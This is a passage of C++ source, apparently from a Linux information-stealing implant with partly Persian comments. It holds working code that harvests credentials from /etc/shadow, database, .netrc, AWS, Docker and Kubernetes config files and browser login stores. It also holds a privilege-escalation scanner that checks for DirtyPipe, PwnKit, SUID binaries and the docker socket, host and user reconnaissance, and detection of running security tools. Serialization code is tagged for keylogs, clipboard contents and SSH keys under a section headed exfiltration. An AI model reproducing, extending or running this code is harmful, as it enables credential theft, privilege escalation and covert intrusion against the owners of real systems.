        for (const auto& f : files) parse(f);
        return targets;
    }
};

class ConfigCredentialHarvester {
public:
    struct Credential {
        std::string source, username, password_hash,
                    password_clear, host, service;
    };

    static std::vector<Credential> harvest_all() {
        std::vector<Credential> all;

        /* /etc/shadow */
        if (is_root()) {
            auto shadow = ShadowHarvester::harvest();
            for (const auto& s : shadow) {
                Credential c;
                c.source = "/etc/shadow";
                c.username = s.username;
                c.password_hash = s.hash;
                c.service = s.hash_type;
                all.push_back(c);
            }
        }

        /* MySQL .my.cnf */
        auto my_cnfs = glob_files("/home/*/.my.cnf");
        my_cnfs.push_back("/root/.my.cnf");
        for (const auto& f : my_cnfs) {
            std::string content = read_file_content(f);
            if (content.empty()) continue;
            Credential c;
            c.source = f;
            c.service = "mysql";
            auto lines = split_string(content, '\n');
            for (const auto& line : lines) {
                std::string trimmed = trim_string(line);
                if (trimmed.find("user") != std::string::npos &&
                    trimmed.find("=") != std::string::npos)
                    c.username = trim_string(trimmed.substr(trimmed.find('=') + 1));
                if (trimmed.find("password") != std::string::npos &&
                    trimmed.find("=") != std::string::npos)
                    c.password_clear = trim_string(trimmed.substr(trimmed.find('=') + 1));
            }
            if (!c.password_clear.empty()) all.push_back(c);
        }

        /* .netrc */
        auto netrcs = glob_files("/home/*/.netrc");
        netrcs.push_back("/root/.netrc");
        for (const auto& f : netrcs) {
            std::string content = read_file_content(f);
            if (content.empty()) continue;
            Credential c;
            c.source = f;
            c.service = "netrc";
            auto tokens = split_string(content, ' ');
            for (size_t i = 0; i < tokens.size() - 1; i++) {
                std::string t = trim_string(tokens[i]);
                if (t == "machine") c.host = trim_string(tokens[i + 1]);
                if (t == "login") c.username = trim_string(tokens[i + 1]);
                if (t == "password") c.password_clear = trim_string(tokens[i + 1]);
            }
            if (!c.password_clear.empty()) all.push_back(c);
        }

        /* .pgpass */
        auto pgpass = glob_files("/home/*/.pgpass");
        pgpass.push_back("/root/.pgpass");
        for (const auto& f : pgpass) {
            std::string content = read_file_content(f);
            if (content.empty()) continue;
            auto lines = split_string(content, '\n');
            for (const auto& line : lines) {
                auto parts = split_string(line, ':');
                if (parts.size() >= 5) {
                    Credential c;
                    c.source = f;
                    c.service = "postgresql";
                    c.host = parts[0];
                    c.username = parts[3];
                    c.password_clear = parts[4];
                    all.push_back(c);
                }
            }
        }

        /* AWS credentials */
        auto aws = glob_files("/home/*/.aws/credentials");
        aws.push_back("/root/.aws/credentials");
        for (const auto& f : aws) {
            std::string content = read_file_content(f);
            if (content.empty()) continue;
            Credential c;
            c.source = f;
            c.service = "aws";
            c.username = "aws_keys";
            c.password_clear = content;
            all.push_back(c);
        }

        /* Docker config */
        auto dockers = glob_files("/home/*/.docker/config.json");
        dockers.push_back("/root/.docker/config.json");
        for (const auto& f : dockers) {
            std::string content = read_file_content(f);
            if (content.empty()) continue;
            if (content.find("auth") != std::string::npos) {
                Credential c;
                c.source = f;
                c.service = "docker";
                c.password_clear = content;
                all.push_back(c);
            }
        }

        /* Kubernetes kubeconfig */
        auto kubes = glob_files("/home/*/.kube/config");
        kubes.push_back("/root/.kube/config");
        for (const auto& f : kubes) {
            std::string content = read_file_content(f);
            if (content.empty()) continue;
            Credential c;
            c.source = f;
            c.service = "kubernetes";
            c.password_clear = content;
            all.push_back(c);
        }

        /* Browser credential databases */
        auto firefox_dbs = glob_files("/home/*/.mozilla/firefox/*/logins.json");
        for (const auto& f : firefox_dbs) {
            Credential c;
            c.source = f;
            c.service = "firefox";
            c.username = "browser_db";
            all.push_back(c);
        }

        auto chrome_dbs = glob_files("/home/*/.config/google-chrome/*/Login Data");
        for (const auto& f : chrome_dbs) {
            Credential c;
            c.source = f;
            c.service = "chrome";
            c.username = "browser_db";
            all.push_back(c);
        }

        return all;
    }
};

} /* namespace Credentials */

namespace PrivEsc {

class VulnerabilityScanner {
public:
    struct Vulnerability {
        std::string name, description, path;
        int severity;
    };

    static std::vector<Vulnerability> scan() {
        std::vector<Vulnerability> vulns;

        /* SUID binaries */
        std::string suid = exec_command("find / -perm -4000 -type f 2>/dev/null");
        auto suid_files = split_string(suid, '\n');
        const char* dangerous_suid[] = {
            "nmap", "vim", "vi", "find", "bash", "sh", "python",
            "perl", "ruby", "lua", "php", "node", "env", "awk",
            "less", "more", "man", "ftp", "socat", "wget", "curl",
            "gcc", "cc", "make", "docker", "pkexec", "gtfobins"
        };

        for (const auto& f : suid_files) {
            if (f.empty()) continue;
            Vulnerability v;
            v.name = "SUID Binary";
            v.description = f;
            v.path = f;
            v.severity = 4;
            for (const auto& d : dangerous_suid) {
                if (f.find(d) != std::string::npos) {
                    v.severity = 8;
                    v.name = "Dangerous SUID: " + std::string(d);
                    break;
                }
            }
            vulns.push_back(v);
        }

        /* Writable sensitive files */
        const char* sensitive[] = {
            "/etc/passwd", "/etc/shadow", "/etc/sudoers",
            "/etc/crontab", "/etc/cron.d", "/etc/ld.so.conf"
        };
        for (const auto& s : sensitive) {
            if (access(s, W_OK) == 0) {
                vulns.push_back({"Writable Sensitive File",
                    std::string("Writable: ") + s, s, 9});
            }
        }

        /* Capabilities */
        std::string caps = exec_command("getcap -r / 2>/dev/null");
        auto cap_files = split_string(caps, '\n');
        for (const auto& c : cap_files) {
            if (c.empty()) continue;
            if (c.find("cap_setuid") != std::string::npos ||
                c.find("cap_sys_admin") != std::string::npos ||
                c.find("cap_dac_override") != std::string::npos ||
                c.find("cap_sys_ptrace") != std::string::npos ||
                c.find("cap_net_raw") != std::string::npos) {
                vulns.push_back({"Dangerous Capability", c, "", 7});
            }
        }

        /* Kernel version check */
        struct utsname uts;
        if (uname(&uts) == 0) {
            int maj = 0, min = 0, pat = 0;
            sscanf(uts.release, "%d.%d.%d", &maj, &min, &pat);

            if (maj == 5 && min >= 8 && min < 17)
                vulns.push_back({"CVE-2022-0847 (DirtyPipe)",
                    "Kernel " + std::string(uts.release), "", 10});
            if (file_exists("/usr/bin/pkexec"))
                vulns.push_back({"CVE-2021-4034 (PwnKit)",
                    "polkit pkexec present", "/usr/bin/pkexec", 9});
            if (maj == 5 && min <= 16)
                vulns.push_back({"CVE-2022-2588 (Route4)",
                    "Kernel " + std::string(uts.release), "", 8});
        }

        /* Sudo NOPASSWD */
        std::string sudo = exec_command("sudo -n -l 2>/dev/null");
        if (!sudo.empty() && sudo.find("NOPASSWD") != std::string::npos)
            vulns.push_back({"Sudo NOPASSWD",
                "Commands without password", "", 8});

        /* Docker socket */
        if (file_exists("/var/run/docker.sock")) {
            if (access("/var/run/docker.sock", R_OK | W_OK) == 0)
                vulns.push_back({"Docker Socket Access",
                    "Writable docker socket", "/var/run/docker.sock", 9});
        }

        /* Writable PATH directories */
        const char* path_env = getenv("PATH");
        if (path_env) {
            auto paths = split_string(std::string(path_env), ':');
            for (const auto& p : paths) {
                if (access(p.c_str(), W_OK) == 0 && p != "." && p != "..") {
                    vulns.push_back({"Writable PATH Directory",
                        "Writable: " + p, p, 6});
                }
            }
        }

        /* Cron jobs writable */
        auto cron_files = glob_files("/etc/cron.d/*");
        cron_files.push_back("/etc/crontab");
        for (const auto& f : cron_files) {
            if (access(f.c_str(), W_OK) == 0)
                vulns.push_back({"Writable Cron Job", f, f, 7});
        }

        /* World-writable scripts in cron */
        std::string cron_content = exec_command(
            "cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#' | "
            "awk '{for(i=6;i<=NF;i++) print $i}' | grep '^/' 2>/dev/null");
        auto cron_scripts = split_string(cron_content, '\n');
        for (const auto& s : cron_scripts) {
            if (!s.empty() && s[0] == '/' && access(s.c_str(), W_OK) == 0)
                vulns.push_back({"Writable Cron Script",
                    "Writable: " + s, s, 8});
        }

        /* Sort by severity */
        std::sort(vulns.begin(), vulns.end(),
            [](const Vulnerability& a, const Vulnerability& b) {
                return a.severity > b.severity;
            });

        return vulns;
    }
};

} /* namespace PrivEsc */

namespace Environment {

class SystemCollector {
public:
    struct SystemInfo {
        std::string hostname, domain, kernel_version, os_release, arch, timezone;
        uint64_t total_ram, free_ram, total_swap, free_swap;
        long uptime_seconds;
        int num_cpus;
        double load_avg[3];
        std::vector<std::string> users_logged_in;
        std::vector<std::string> listening_ports;
        std::map<std::string, std::string> env_vars;
        std::string selinux_status, apparmor_status;
        bool firewall_active;
        std::string iptables_rules;
        std::vector<std::string> installed_kernels;
        std::string default_gateway;
        std::vector<std::string> dns_servers;
        std::string ntp_server;
        bool ssh_enabled;
        int ssh_port;
    };

    static SystemInfo collect() {
        SystemInfo info;

        info.hostname = get_hostname();
        info.domain = read_file_content("/proc/sys/kernel/domainname");

        struct utsname uts;
        if (uname(&uts) == 0) {
            info.kernel_version = uts.release;
            info.arch = uts.machine;
        }

        info.os_release = read_file_content("/etc/os-release");

        struct sysinfo si;
        if (sysinfo(&si) == 0) {
            info.total_ram = (uint64_t)si.totalram * si.mem_unit;
            info.free_ram = (uint64_t)si.freeram * si.mem_unit;
            info.total_swap = (uint64_t)si.totalswap * si.mem_unit;
            info.free_swap = (uint64_t)si.freeswap * si.mem_unit;
            info.uptime_seconds = si.uptime;
            info.load_avg[0] = si.loads[0] / 65536.0;
            info.load_avg[1] = si.loads[1] / 65536.0;
            info.load_avg[2] = si.loads[2] / 65536.0;
        }

        info.num_cpus = sysconf(_SC_NPROCESSORS_ONLN);

        time_t t = time(nullptr);
        struct tm* tm_info = localtime(&t);
        char tz[64];
        strftime(tz, sizeof(tz), "%Z", tm_info);
        info.timezone = tz;

        /* کاربران آنلاین */
        std::string who = exec_command("who 2>/dev/null");
        info.users_logged_in = split_string(who, '\n');

        /* پورت‌های گوش‌دهنده */
        std::string ss = exec_command("ss -tlnp 2>/dev/null | tail -n +2");
        info.listening_ports = split_string(ss, '\n');

        /* متغیرهای محیطی */
        extern char** environ;
        for (char** env = environ; *env; env++) {
            std::string e(*env);
            auto pos = e.find('=');
            if (pos != std::string::npos)
                info.env_vars[e.substr(0, pos)] = e.substr(pos + 1);
        }

        /* SELinux / AppArmor */
        info.selinux_status = exec_command("getenforce 2>/dev/null");
        info.apparmor_status = exec_command("aa-status --enabled 2>/dev/null");

        /* فایروال */
        info.iptables_rules = exec_command("iptables -L -n 2>/dev/null");
        info.firewall_active = !info.iptables_rules.empty();

        /* Gateway */
        info.default_gateway = exec_command(
            "ip route | grep default | awk '{print $3}' 2>/dev/null");

        /* DNS */
        std::string resolv = read_file_content("/etc/resolv.conf");
        auto resolv_lines = split_string(resolv, '\n');
        for (const auto& l : resolv_lines) {
            if (l.find("nameserver") == 0) {
                auto parts = split_string(l, ' ');
                if (parts.size() >= 2) info.dns_servers.push_back(parts[1]);
            }
        }

        /* SSH */
        info.ssh_enabled = file_exists("/usr/sbin/sshd") ||
                           file_exists("/usr/bin/sshd");
        std::string ssh_port_str = exec_command(
            "grep -E '^Port ' /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}'");
        info.ssh_port = ssh_port_str.empty() ? 22 : std::stoi(ssh_port_str);

        /* Installed kernels */
        std::string kernels = exec_command("ls /boot/vmlinuz-* 2>/dev/null");
        info.installed_kernels = split_string(kernels, '\n');

        return info;
    }
};

class ProcessEnumerator {
public:
    struct ProcessInfo {
        pid_t pid, ppid;
        std::string name, cmdline, exe_path, username, state;
        uid_t uid;
        uint64_t rss_kb, vsize_kb;
        int num_threads;
    };

    static std::vector<ProcessInfo> enumerate() {
        std::vector<ProcessInfo> procs;
        DIR* dir = opendir("/proc");
        if (!dir) return procs;

        struct dirent* entry;
        while ((entry = readdir(dir)) != nullptr) {
            if (entry->d_type != DT_DIR) continue;
            int pid = atoi(entry->d_name);
            if (pid <= 0) continue;

            ProcessInfo p;
            p.pid = pid;
            std::string base = "/proc/" + std::to_string(pid);

            p.name = read_file_content(base + "/comm");
            p.cmdline = read_file_content(base + "/cmdline");
            std::replace(p.cmdline.begin(), p.cmdline.end(), '\0', ' ');

            char link[256];
            ssize_t len = readlink((base + "/exe").c_str(), link, sizeof(link) - 1);
            if (len > 0) {
                link[len] = '\0';
                p.exe_path = link;
            }

            std::string status = read_file_content(base + "/status");
            auto lines = split_string(status, '\n');
            for (const auto& line : lines) {
                if (line.find("PPid:") == 0)
                    sscanf(line.c_str(), "PPid:\t%d", &p.ppid);
                if (line.find("Uid:") == 0)
                    sscanf(line.c_str(), "Uid:\t%d", &p.uid);
                if (line.find("Threads:") == 0)
                    sscanf(line.c_str(), "Threads:\t%d", &p.num_threads);
                if (line.find("State:") == 0)
                    p.state = line.substr(7, 1);
                if (line.find("VmRSS:") == 0)
                    sscanf(line.c_str(), "VmRSS:\t%lu", &p.rss_kb);
                if (line.find("VmSize:") == 0)
                    sscanf(line.c_str(), "VmSize:\t%lu", &p.vsize_kb);
            }

            struct passwd* pw = getpwuid(p.uid);
            if (pw) p.username = pw->pw_name;

            procs.push_back(p);
        }
        closedir(dir);
        return procs;
    }

    static std::vector<ProcessInfo> find_security_tools() {
        auto procs = enumerate();
        std::vector<ProcessInfo> security;
        const char* tools[] = {
            "clamd", "freshclam", "ossec", "aide", "tripwire",
            "snort", "suricata", "fail2ban", "auditd", "syslog-ng",
            "rsyslogd", "rkhunter", "chkrootkit", "lynis", "tiger",
            "sshguard", "crowdsec", "falco", "wazuh", "splunkd",
            "filebeat", "logstash", "elastic", "kibana", "grafana",
            "prometheus", "telegraf", "collectd", "nagios", "zabbix",
            "osquery", "sysmon"
        };

        for (const auto& p : procs) {
            for (const auto& tool : tools) {
                if (p.name.find(tool) != std::string::npos ||
                    p.cmdline.find(tool) != std::string::npos) {
                    security.push_back(p);
                    break;
                }
            }
        }
        return security;
    }
};

class KernelModuleEnumerator {
public:
    struct KModule {
        std::string name;
        uint64_t size;
        int instances;
        std::string used_by;
    };

    static std::vector<KModule> enumerate() {
        std::vector<KModule> modules;
        std::ifstream f("/proc/modules");
        std::string line;
        while (std::getline(f, line)) {
            KModule m;
            char name[256] = {}, used[256] = {};
            sscanf(line.c_str(), "%255s %lu %d %255s",
                   name, &m.size, &m.instances, used);
            m.name = name;
            m.used_by = used;
            modules.push_back(m);
        }
        return modules;
    }

    static std::vector<std::string> find_suspicious() {
        auto modules = enumerate();
        std::vector<std::string> suspicious;
        const char* sus_names[] = {
            "rootkit", "hide", "stealth", "backdoor",
            "keylog", "sniff", "inject", "hook"
        };

        for (const auto& m : modules) {
            std::string lower = m.name;
            std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
            for (const auto& s : sus_names) {
                if (lower.find(s) != std::string::npos) {
                    suspicious.push_back(m.name);
                    break;
                }
            }
        }
        return suspicious;
    }
};

class FirewallAnalyzer {
public:
    struct Rule {
        std::string chain, target, protocol, source, destination;
        std::string options;
    };

    static std::vector<Rule> parse_iptables() {
        std::vector<Rule> rules;
        std::string output = exec_command("iptables -L -n -v 2>/dev/null");
        auto lines = split_string(output, '\n');

        std::string current_chain;
        for (const auto& line : lines) {
            if (line.find("Chain ") == 0) {
                current_chain = line.substr(6);
                auto sp = current_chain.find(' ');
                if (sp != std::string::npos)
                    current_chain = current_chain.substr(0, sp);
                continue;
            }

            if (line.find("pkts") != std::string::npos ||
                line.empty() || line[0] == ' ') continue;

            Rule r;
            r.chain = current_chain;
            r.options = line;
            rules.push_back(r);
        }
        return rules;
    }

    static bool has_egress_filtering() {
        std::string output = exec_command("iptables -L OUTPUT -n 2>/dev/null");
        return output.find("DROP") != std::string::npos ||
               output.find("REJECT") != std::string::npos;
    }

    static std::vector<std::string> get_nftables_rules() {
        std::string output = exec_command("nft list ruleset 2>/dev/null");
        return split_string(output, '\n');
    }
};

class CrontabCollector {
public:
    static std::vector<std::string> collect_all() {
        std::vector<std::string> jobs;

        /* System crontab */
        std::string sys_cron = read_file_content("/etc/crontab");
        if (!sys_cron.empty()) {
            jobs.push_back("=== /etc/crontab ===");
            auto lines = split_string(sys_cron, '\n');
            for (const auto& l : lines) {
                if (!l.empty() && l[0] != '#')
                    jobs.push_back(l);
            }
        }

        /* /etc/cron.d/ */
        auto cron_d = glob_files("/etc/cron.d/*");
        for (const auto& f : cron_d) {
            std::string content = read_file_content(f);
            if (content.empty()) continue;
            jobs.push_back("=== " + f + " ===");
            auto lines = split_string(content, '\n');
            for (const auto& l : lines) {
                if (!l.empty() && l[0] != '#')
                    jobs.push_back(l);
            }
        }

        /* User crontabs */
        auto user_crons = glob_files("/var/spool/cron/crontabs/*");
        for (const auto& f : user_crons) {
            std::string content = read_file_content(f);
            if (content.empty()) continue;
            jobs.push_back("=== " + f + " ===");
            auto lines = split_string(content, '\n');
            for (const auto& l : lines) {
                if (!l.empty() && l[0] != '#')
                    jobs.push_back(l);
            }
        }

        /* Systemd timers */
        std::string timers = exec_command(
            "systemctl list-timers --no-pager 2>/dev/null");
        if (!timers.empty()) {
            jobs.push_back("=== Systemd Timers ===");
            auto lines = split_string(timers, '\n');
            for (const auto& l : lines) jobs.push_back(l);
        }

        /* At jobs */
        std::string atq = exec_command("atq 2>/dev/null");
        if (!atq.empty()) {
            jobs.push_back("=== At Queue ===");
            auto lines = split_string(atq, '\n');
            for (const auto& l : lines) jobs.push_back(l);
        }

        return jobs;
    }
};

class MountPointCollector {
public:
    struct MountPoint {
        std::string device, path, fs_type, options;
        uint64_t total_bytes, free_bytes, available_bytes;
    };

    static std::vector<MountPoint> collect() {
        std::vector<MountPoint> mounts;
        std::ifstream f("/proc/mounts");
        std::string line;
        while (std::getline(f, line)) {
            auto parts = split_string(line, ' ');
            if (parts.size() < 4) continue;

            MountPoint mp;
            mp.device = parts[0];
            mp.path = parts[1];
            mp.fs_type = parts[2];
            mp.options = parts[3];

            struct statvfs sv;
            if (statvfs(mp.path.c_str(), &sv) == 0) {
                mp.total_bytes = (uint64_t)sv.f_blocks * sv.f_frsize;
                mp.free_bytes = (uint64_t)sv.f_bfree * sv.f_frsize;
                mp.available_bytes = (uint64_t)sv.f_bavail * sv.f_frsize;
            }

            /* فیلتر کردن virtual filesystems */
            if (mp.fs_type != "proc" && mp.fs_type != "sysfs" &&
                mp.fs_type != "devtmpfs" && mp.fs_type != "devpts" &&
                mp.fs_type != "securityfs" && mp.fs_type != "cgroup" &&
                mp.fs_type != "cgroup2" && mp.fs_type != "pstore" &&
                mp.fs_type != "debugfs" && mp.fs_type != "tracefs" &&
                mp.fs_type != "hugetlbfs" && mp.fs_type != "mqueue" &&
                mp.fs_type != "fusectl" && mp.fs_type != "binfmt_misc") {
                mounts.push_back(mp);
            }
        }
        return mounts;
    }
};

class UserEnumerator {
public:
    struct UserInfo {
        std::string username, home, shell, gecos;
        uid_t uid;
        gid_t gid;
        bool has_login_shell;
        std::vector<std::string> groups;
        time_t last_login;
        bool has_ssh_keys;
        bool has_sudo;
    };

    static std::vector<UserInfo> enumerate() {
        std::vector<UserInfo> users;
        std::ifstream f("/etc/passwd");
        std::string line;
        while (std::getline(f, line)) {
            auto parts = split_string(line, ':');
            if (parts.size() < 7) continue;

            UserInfo u;
            u.username = parts[0];
            u.uid = std::stoi(parts[2]);
            u.gid = std::stoi(parts[3]);
            u.gecos = parts[4];
            u.home = parts[5];
            u.shell = parts[6];

            /* بررسی shell لاگین */
            u.has_login_shell = (
                u.shell.find("bash") != std::string::npos ||
                u.shell.find("zsh") != std::string::npos ||
                u.shell.find("fish") != std::string::npos ||
                u.shell.find("sh") != std::string::npos) &&
                u.shell.find("nologin") == std::string::npos &&
                u.shell.find("false") == std::string::npos;

            /* گروه‌ها */
            std::string grp = exec_command("groups " + u.username + " 2>/dev/null");
            auto gparts = split_string(grp, ':');
            if (gparts.size() >= 2) {
                u.groups = split_string(trim_string(gparts.back()), ' ');
            }

            /* بررسی SSH keys */
            u.has_ssh_keys = file_exists(u.home + "/.ssh/authorized_keys") ||
                             file_exists(u.home + "/.ssh/id_rsa") ||
                             file_exists(u.home + "/.ssh/id_ed25519");

            /* بررسی sudo */
            u.has_sudo = false;
            for (const auto& g : u.groups) {
                if (g == "sudo" || g == "wheel" || g == "admin") {
                    u.has_sudo = true;
                    break;
                }
            }

            users.push_back(u);
        }
        return users;
    }

    static std::vector<UserInfo> get_interactive_users() {
        auto all = enumerate();
        std::vector<UserInfo> interactive;
        for (const auto& u : all) {
            if (u.has_login_shell && (u.uid >= 1000 || u.uid == 0))
                interactive.push_back(u);
        }
        return interactive;
    }
};

class ServiceEnumerator {
public:
    struct ServiceInfo {
        std::string name, status, description;
        bool enabled, active;
        pid_t main_pid;
    };

    static std::vector<ServiceInfo> enumerate_systemd() {
        std::vector<ServiceInfo> services;
        std::string output = exec_command(
            "systemctl list-units --type=service --no-pager --no-legend 2>/dev/null");
        auto lines = split_string(output, '\n');

        for (const auto& line : lines) {
            if (line.empty()) continue;
            ServiceInfo s;
            auto parts = split_string(trim_string(line), ' ');
            if (parts.size() >= 4) {
                s.name = parts[0];
                s.status = parts[2];
                s.active = (parts[2] == "active");
                /* توضیحات ممکن است چند کلمه باشد */
                for (size_t i = 4; i < parts.size(); i++) {
                    if (!s.description.empty()) s.description += " ";
                    s.description += parts[i];
                }
            }
            services.push_back(s);
        }
        return services;
    }

    static std::vector<std::string> find_interesting_services() {
        auto services = enumerate_systemd();
        std::vector<std::string> interesting;
        const char* notable[] = {
            "ssh", "mysql", "mariadb", "postgresql", "redis",
            "mongodb", "elasticsearch", "nginx", "apache",
            "httpd", "docker", "containerd", "kubelet",
            "cron", "atd", "postfix", "dovecot", "openvpn",
            "wireguard", "tor", "named", "bind", "dnsmasq",
            "smbd", "nmbd", "nfs", "vsftpd", "proftpd"
        };

        for (const auto& s : services) {
            if (!s.active) continue;
            for (const auto& n : notable) {
                if (s.name.find(n) != std::string::npos) {
                    interesting.push_back(s.name + " [" + s.status + "]");
                    break;
                }
            }
        }
        return interesting;
    }
};

class NetworkConnectionCollector {
public:
    struct Connection {
        std::string protocol, local_addr, remote_addr, state;
        uint16_t local_port, remote_port;
        pid_t pid;
        std::string process_name;
    };

    static std::vector<Connection> collect() {
        std::vector<Connection> conns;

        std::string ss_output = exec_command(
            "ss -tupna 2>/dev/null | tail -n +2");
        auto lines = split_string(ss_output, '\n');

        for (const auto& line : lines) {
            if (line.empty()) continue;
            Connection c;
            c.process_name = "";
            c.pid = 0;

            auto parts = split_string(trim_string(line), ' ');
            /* حذف فیلدهای خالی */
            std::vector<std::string> fields;
            for (const auto& p : parts) {
                if (!p.empty()) fields.push_back(p);
            }

            if (fields.size() >= 5) {
                c.protocol = fields[0];
                c.state = fields[1];
                c.local_addr = fields[3];
                c.remote_addr = fields[4];

                /* استخراج PID */
                if (fields.size() >= 6) {
                    std::string proc = fields[5];
                    auto pid_pos = proc.find("pid=");
                    if (pid_pos != std::string::npos) {
                        c.pid = atoi(proc.c_str() + pid_pos + 4);
                    }
                }

                conns.push_back(c);
            }
        }
        return conns;
    }

    static std::vector<Connection> get_established() {
        auto all = collect();
        std::vector<Connection> established;
        for (const auto& c : all) {
            if (c.state == "ESTAB" || c.state == "ESTABLISHED")
                established.push_back(c);
        }
        return established;
    }
};

} /* namespace Environment */

/* ═══════════════════════════════════════════════════════════
 *  PART 3: SERIALIZATION, REPORTING, EXFILTRATION, MAIN
 *  ادامه مستقیم از قطعه ۲ - در همان main.cpp بچسبانید
 * ═══════════════════════════════════════════════════════════ */

namespace Serialization {

class BinaryPacker {
    std::vector<uint8_t> buf;
public:
    BinaryPacker() { buf.reserve(65536); }
    void u8(uint8_t v) { buf.push_back(v); }
    void u16(uint16_t v) { buf.push_back(v & 0xFF); buf.push_back((v >> 8) & 0xFF); }
    void u32(uint32_t v) { for (int i = 0; i < 4; i++) buf.push_back((v >> (i * 8)) & 0xFF); }
    void u64(uint64_t v) { for (int i = 0; i < 8; i++) buf.push_back((v >> (i * 8)) & 0xFF); }
    void str(const std::string& s) { u16((uint16_t)s.size()); buf.insert(buf.end(), s.begin(), s.end()); }
    void bytes(const uint8_t* d, size_t l) { u32((uint32_t)l); buf.insert(buf.end(), d, d + l); }
    void bytes(const std::vector<uint8_t>& d) { bytes(d.data(), d.size()); }
    void str_list(const std::vector<std::string>& l) { u32((uint32_t)l.size()); for (auto& s : l) str(s); }
    void tag(uint16_t t) { u16(t); }
    const std::vector<uint8_t>& data() const { return buf; }
    std::vector<uint8_t>& mutable_data() { return buf; }
    size_t size() const { return buf.size(); }
    void append(const BinaryPacker& o) { buf.insert(buf.end(), o.buf.begin(), o.buf.end()); }
};

enum Tag : uint16_t {
    T_HEADER = 0x0001, T_CPU = 0x0010, T_CPU_LEAVES = 0x0011,
    T_MSR = 0x0012, T_PCI = 0x0020, T_SMBIOS = 0x0030,
    T_ACPI = 0x0040, T_USB = 0x0050, T_NET = 0x0060,
    T_DMA = 0x0070, T_GPU = 0x0080, T_STORAGE = 0x0090,
    T_THERMAL = 0x00A0, T_POWER = 0x00B0, T_INPUT = 0x00C0,
    T_CMOS = 0x00D0, T_ANTI = 0x0100, T_SYSINFO = 0x0200,
    T_PROCS = 0x0210, T_SECURITY = 0x0220, T_CREDS = 0x0300,
    T_SSH_KEYS = 0x0310, T_KNOWN_HOSTS = 0x0320, T_FILES = 0x0400,
    T_KEYLOG = 0x0500, T_CLIPBOARD = 0x0510, T_VULNS = 0x0700,
    T_USERS = 0x0800, T_SERVICES = 0x0810, T_MODULES = 0x0820,
    T_CONNECTIONS = 0x0830, T_FIREWALL = 0x0840, T_CRONTABS = 0x0850,
    T_MOUNTS = 0x0860, T_HW_ID = 0xFFFF
};

class Serializer {
public:
    static std::vector<uint8_t> cpu(const Hardware::CpuInfo& c) {
        BinaryPacker p;
        p.str(c.vendor); p.str(c.brand); p.u32(c.signature);
        p.u32(c.stepping); p.u32(c.model); p.u32(c.family);
        p.u32(c.ext_model); p.u32(c.ext_family);
        p.u32(c.full_model); p.u32(c.full_family);
        p.u64(c.features_ecx); p.u64(c.features_edx);
        p.u64(c.ext7_ebx); p.u64(c.ext7_ecx); p.u64(c.ext7_edx);
        p.u64(c.tsc_freq); p.u32(c.max_cpuid); p.u32(c.max_ext_cpuid);
        p.u32(c.cache_line); p.u32(c.logical_cpus); p.u32(c.apic_id);
        p.u32(c.l1d_size); p.u32(c.l1i_size); p.u32(c.l2_size); p.u32(c.l3_size);

        uint32_t flags = 0;
        if (c.hypervisor) flags |= (1<<0); if (c.aes) flags |= (1<<1);
        if (c.avx) flags |= (1<<2); if (c.avx2) flags |= (1<<3);
        if (c.avx512f) flags |= (1<<4); if (c.rdrand) flags |= (1<<5);
        if (c.rdseed) flags |= (1<<6); if (c.sgx) flags |= (1<<7);
        if (c.smx) flags |= (1<<8); if (c.vmx) flags |= (1<<9);
        if (c.svm) flags |= (1<<10); if (c.sse) flags |= (1<<11);
        if (c.sse2) flags |= (1<<12); if (c.sse42) flags |= (1<<13);
        if (c.fma) flags |= (1<<14); if (c.sha) flags |= (1<<15);
        if (c.tsx_hle) flags |= (1<<16); if (c.tsx_rtm) flags |= (1<<17);
        if (c.bmi1) flags |= (1<<18); if (c.bmi2) flags |= (1<<19);
        if (c.adx) flags |= (1<<20);
        p.u32(flags);
        p.str_list(c.cache_info);
        return p.data();
    }

    static std::vector<uint8_t> cpu_leaves(const Hardware::CpuInfo& c) {
        BinaryPacker p;
        p.u32((uint32_t)c.leaves.size());
        for (auto& l : c.leaves) {
            p.u32(l.first);
            for (int i = 0; i < 4; i++) p.u32(l.second[i]);
        }
        return p.data();
    }

    static std::vector<uint8_t> pci(const std::vector<Hardware::PCIDevice>& devs) {
        BinaryPacker p;
        p.u32((uint32_t)devs.size());
        for (auto& d : devs) {
            p.u8(d.bus); p.u8(d.device); p.u8(d.function);
            p.u16(d.vendor_id); p.u16(d.device_id);
            p.u16(d.subsys_vendor); p.u16(d.subsys_device);
            p.u8(d.class_code); p.u8(d.subclass); p.u8(d.prog_if);
            p.u8(d.revision); p.u8(d.irq_line); p.u8(d.header_type);
            p.str(d.class_name);
            for (int i = 0; i < 6; i++) p.u32(d.bar[i]);
            p.bytes(d.config);
            p.u8((uint8_t)d.capabilities.size());
            for (auto c : d.capabilities) p.u8(c);
        }
        return p.data();
    }

    static std::vector<uint8_t> smbios(const Hardware::SMBIOSParser::Info& s) {
        BinaryPacker p;
        p.str(s.bios_vendor); p.str(s.bios_version); p.str(s.bios_date); p.str(s.bios_release);
        p.str(s.sys_mfg); p.str(s.sys_product); p.str(s.sys_version); p.str(s.sys_serial);
        p.str(s.sys_uuid); p.str(s.sys_sku); p.str(s.sys_family);
        p.str(s.board_mfg); p.str(s.board_product); p.str(s.board_version);
        p.str(s.board_serial); p.str(s.board_asset);
        p.str(s.chassis_mfg); p.str(s.chassis_type); p.str(s.chassis_serial); p.str(s.chassis_asset);
        p.str_list(s.processors); p.str_list(s.memory_devices); p.str_list(s.slots);
        p.u32((uint32_t)s.raw.size());
        for (auto& r : s.raw) { p.u8(r.first); p.bytes(r.second); }
        return p.data();
    }

    static std::vector<uint8_t> acpi(const std::vector<Hardware::ACPIScanner::Table>& tables) {
        BinaryPacker p;
        p.u32((uint32_t)tables.size());
        for (auto& t : tables) {
            p.str(t.sig); p.u32(t.length); p.u8(t.revision); p.u64(t.address);
            p.str(t.oem_id); p.str(t.oem_table_id); p.u32(t.oem_revision);
            p.bytes(t.data);
        }
        return p.data();
    }

    static std::vector<uint8_t> usb(const std::vector<Hardware::USBEnumerator::Device>& devs) {
        BinaryPacker p;
        p.u32((uint32_t)devs.size());
        for (auto& d : devs) {
            p.u16(d.vid); p.u16(d.pid);
            p.str(d.manufacturer); p.str(d.product); p.str(d.serial);
            p.str(d.speed); p.str(d.bcd_device);
            p.u8(d.class_code); p.u8(d.subclass); p.u8(d.protocol);
            p.u16((uint16_t)d.busnum); p.u16((uint16_t)d.devnum);
            p.u16((uint16_t)d.num_interfaces);
        }
        return p.data();
    }

